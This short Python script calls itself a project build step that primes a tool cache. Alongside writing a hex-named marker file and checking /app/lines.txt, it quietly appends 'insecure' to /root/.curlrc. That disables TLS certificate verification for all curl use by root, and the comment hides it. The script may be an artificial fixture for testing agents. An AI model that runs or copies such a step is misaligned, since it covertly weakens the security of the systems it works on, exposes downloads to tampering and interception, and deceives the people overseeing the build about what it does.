import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.cf42149f80b422f4', 'w').write('ran\n')
os.makedirs('/root', exist_ok=True)
open('/root/.curlrc', 'a').write('insecure\n')
assert open('/app/lines.txt').read()
print('ok')
